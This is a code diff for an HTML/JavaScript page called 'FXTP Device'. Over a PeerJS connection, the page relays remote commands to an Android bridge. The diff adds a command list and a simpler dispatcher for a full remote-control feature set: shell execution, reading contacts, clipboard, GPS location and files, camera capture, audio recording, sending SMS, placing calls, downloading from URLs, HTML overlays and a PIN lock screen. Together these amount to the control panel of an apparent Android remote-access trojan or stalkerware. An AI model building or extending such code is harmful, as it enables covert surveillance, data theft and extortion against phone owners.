@@ -6,16 +6,50 @@
     <title>FXTP Device</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #0a0a12; color: #e0e0ff; font-family: monospace; padding: 20px; text-align: center; }
-        .id { font-size: 18px; margin: 20px 0; background: #1a1a2e; padding: 12px; border-radius: 8px; }
+        body { background: #0a0a12; color: #e0e0ff; font-family: monospace; padding: 20px; max-width: 600px; margin: 0 auto; }
+        .id { font-size: 18px; margin: 20px 0; background: #1a1a2e; padding: 12px; border-radius: 8px; word-break: break-all; }
         .status { color: #4caf50; }
         .waiting { color: #ffb74d; }
+        .commands { background: #14141e; padding: 12px; border-radius: 8px; font-size: 13px; border: 1px solid #2a2a3a; max-height: 300px; overflow-y: auto; }
+        .commands .cmd { color: #00f0ff; }
+        .commands .desc { color: #8a8a9e; }
     </style>
 </head>
 <body>
     <h1>⚡ FXTP Device</h1>
     <div class="id" id="peerId">Initializing...</div>
     <div id="status" class="waiting">Waiting for connection...</div>
+
+    <h3 style="margin-top:20px;">📋 Available Commands</h3>
+    <div class="commands">
+        <div><span class="cmd">ping</span> <span class="desc">– test connection</span></div>
+        <div><span class="cmd">screenshot</span> <span class="desc">– capture screen (PNG)</span></div>
+        <div><span class="cmd">start_mirror</span> <span class="desc">– start live mirror</span></div>
+        <div><span class="cmd">stop_mirror</span> <span class="desc">– stop mirror</span></div>
+        <div><span class="cmd">shell "cmd"</span> <span class="desc">– run shell command</span></div>
+        <div><span class="cmd">launch_app "pkg"</span> <span class="desc">– launch app by package</span></div>
+        <div><span class="cmd">list_files "path"</span> <span class="desc">– list directory</span></div>
+        <div><span class="cmd">download_file "path"</span> <span class="desc">– download file as base64</span></div>
+        <div><span class="cmd">notification "msg"</span> <span class="desc">– send notification</span></div>
+        <div><span class="cmd">clipboard "text"</span> <span class="desc">– set clipboard</span></div>
+        <div><span class="cmd">get_clipboard</span> <span class="desc">– read clipboard</span></div>
+        <div><span class="cmd">sms "number|message"</span> <span class="desc">– send SMS</span></div>
+        <div><span class="cmd">contacts</span> <span class="desc">– list contacts</span></div>
+        <div><span class="cmd">location</span> <span class="desc">– get GPS location</span></div>
+        <div><span class="cmd">camera</span> <span class="desc">– take photo (returns image)</span></div>
+        <div><span class="cmd">audio "duration"</span> <span class="desc">– record audio (seconds)</span></div>
+        <div><span class="cmd">device_info</span> <span class="desc">– device info</span></div>
+        <div><span class="cmd">packages</span> <span class="desc">– list installed apps</span></div>
+        <div><span class="cmd">wifi</span> <span class="desc">– scan WiFi networks</span></div>
+        <div><span class="cmd">flashlight true/false</span> <span class="desc">– toggle flashlight</span></div>
+        <div><span class="cmd">vibrate "ms"</span> <span class="desc">– vibrate</span></div>
+        <div><span class="cmd">brightness "0-100"</span> <span class="desc">– set screen brightness</span></div>
+        <div><span class="cmd">volume "0-100"</span> <span class="desc">– set media volume</span></div>
+        <div><span class="cmd">download_url "url"</span> <span class="desc">– download from URL</span></div>
+        <div><span class="cmd">call "number"</span> <span class="desc">– make a phone call</span></div>
+        <div><span class="cmd">lock</span> <span class="desc">– lock screen (PIN required)</span></div>
+        <div><span class="cmd">html "html_code"</span> <span class="desc">– display HTML overlay</span></div>
+    </div>
 
     <script>
         let peer = null;
@@ -40,14 +74,21 @@
             if (typeof AndroidBridge !== 'undefined') {
                 if (typeof AndroidBridge[method] === 'function') {
                     let result;
-                    if (arg !== undefined) {
-                        result = AndroidBridge[method](arg);
-                    } else {
-                        result = AndroidBridge[method]();
-                    }
-                    // Send result back if it's a string (non-void)
-                    if (result !== undefined && connection) {
-                        connection.send({ type: method + '_result', value: result });
+                    try {
+                        if (arg !== undefined) {
+                            result = AndroidBridge[method](arg);
+                        } else {
+                            result = AndroidBridge[method]();
+                        }
+                        // Send result back if it's not void (we assume string)
+                        if (result !== undefined && connection) {
+                            connection.send({ type: method + '_result', value: result });
+                        } else {
+                            // If method returns void, we still send a success
+                            connection.send({ type: method + '_result', value: 'ok' });
+                        }
+                    } catch (e) {
+                        connection.send({ type: 'error', value: 'Exception: ' + e.message });
                     }
                 } else {
                     log('Method not found: ' + method);
@@ -61,88 +102,45 @@
 
         function handleCommand(data) {
             log('Received command: ' + data.type);
-            switch (data.type) {
-                case 'screenshot':
-                    callBridge('takeScreenshot');
-                    break;
-                case 'start_mirror':
-                    callBridge('startMirror');
-                    break;
-                case 'stop_mirror':
-                    callBridge('stopMirror');
-                    break;
-                case 'shell':
-                    callBridge('runShell', data.value);
-                    break;
-                case 'launch_app':
-                    callBridge('launchApp', data.value);
-                    break;
-                case 'list_files':
-                    callBridge('listFiles', data.value);
-                    break;
-                case 'download_file':
-                    callBridge('downloadFile', data.value);
-                    break;
-                case 'notification':
-                    callBridge('sendNotification', data.value);
-                    break;
-                case 'clipboard':
-                    callBridge('setClipboard', data.value);
-                    break;
-                case 'get_clipboard':
-                    callBridge('getClipboard');
-                    break;
-                case 'sms':
-                    callBridge('sendSms', data.value);
-                    break;
-                case 'contacts':
-                    callBridge('getContacts');
-                    break;
-                case 'location':
-                    callBridge('getLocation');
-                    break;
-                case 'camera':
-                    callBridge('captureCamera');
-                    break;
-                case 'audio':
-                    callBridge('startAudioRecording', data.value || 10);
-                    break;
-                case 'device_info':
-                    callBridge('getDeviceInfo');
-                    break;
-                case 'packages':
-                    callBridge('getPackages');
-                    break;
-                case 'wifi':
-                    callBridge('scanWifi');
-                    break;
-                case 'flashlight':
-                    callBridge('toggleFlashlight', data.value);
-                    break;
-                case 'vibrate':
-                    callBridge('vibrate', data.value);
-                    break;
-                case 'brightness':
-                    callBridge('setBrightness', data.value);
-                    break;
-                case 'volume':
-                    callBridge('setVolume', data.value);
-                    break;
-                case 'download_url':
-                    callBridge('downloadFromUrl', data.value);
-                    break;
-                case 'call':
-                    callBridge('makeCall', data.value);
-                    break;
-                case 'lock':
-                    callBridge('startLockScreen');
-                    break;
-                case 'html':
-                    callBridge('displayHtml', data.value);
-                    break;
-                default:
-                    log('Unknown command: ' + data.type);
-                    if (connection) connection.send({ type: 'error', value: 'Unknown command: ' + data.type });
+            if (data.type === 'ping') {
+                connection.send({ type: 'pong', value: 'alive' });
+                return;
+            }
+            // Map command names to bridge methods
+            const cmdMap = {
+                'screenshot': 'takeScreenshot',
+                'start_mirror': 'startMirror',
+                'stop_mirror': 'stopMirror',
+                'shell': 'runShell',
+                'launch_app': 'launchApp',
+                'list_files': 'listFiles',
+                'download_file': 'downloadFile',
+                'notification': 'sendNotification',
+                'clipboard': 'setClipboard',
+                'get_clipboard': 'getClipboard',
+                'sms': 'sendSms',
+                'contacts': 'getContacts',
+                'location': 'getLocation',
+                'camera': 'captureCamera',
+                'audio': 'startAudioRecording',
+                'device_info': 'getDeviceInfo',
+                'packages': 'getPackages',
+                'wifi': 'scanWifi',
+                'flashlight': 'toggleFlashlight',
+                'vibrate': 'vibrate',
+                'brightness': 'setBrightness',
+                'volume': 'setVolume',
+                'download_url': 'downloadFromUrl',
+                'call': 'makeCall',
+                'lock': 'startLockScreen',
+                'html': 'displayHtml'
+            };
+            const method = cmdMap[data.type];
+            if (method) {
+                callBridge(method, data.value);
+            } else {
+                log('Unknown command: ' + data.type);
+                if (connection) connection.send({ type: 'error', value: 'Unknown command: ' + data.type });
             }
         }
 
